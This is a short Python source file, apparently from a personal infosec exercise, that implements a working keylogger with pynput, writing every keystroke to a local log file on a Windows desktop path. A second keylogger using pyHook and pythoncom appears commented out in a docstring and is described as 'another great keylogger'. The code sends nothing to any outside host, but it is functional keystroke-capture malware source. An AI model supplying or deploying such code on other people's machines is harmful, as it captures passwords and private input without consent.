from pynput import keyboard
import logging
file_log="C:\\Users\\acer\\Desktop\\infosec\\keylogger\\log.txt"
def on_press(key):

    logging.basicConfig(filename=file_log,level=logging.DEBUG,format="%(message)s")
    logging.log(10,str(key))

def on_release(key):
    if str(key) == 'Key.esc':
        print('Exiting...')
        return False

with keyboard.Listener(on_press = on_press,on_release = on_release) as listener:
    listener.join()
    
"""

Monitoring Global Input with pyHook
The pyHook library wraps the low-level mouse and keyboard hooks in the
Windows Hooking API.

#another great keylogger :
import pyHook, pythoncom,sys,logging
from pyHook import HookManager
file_log="C:\\Users\\acer\\Desktop\\infosec\\keylogger\\log.txt"

def onkeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format="%(message)s")
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True


hooks_manager = HookManager()
hooks_manager.KeyDown = onkeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
"""
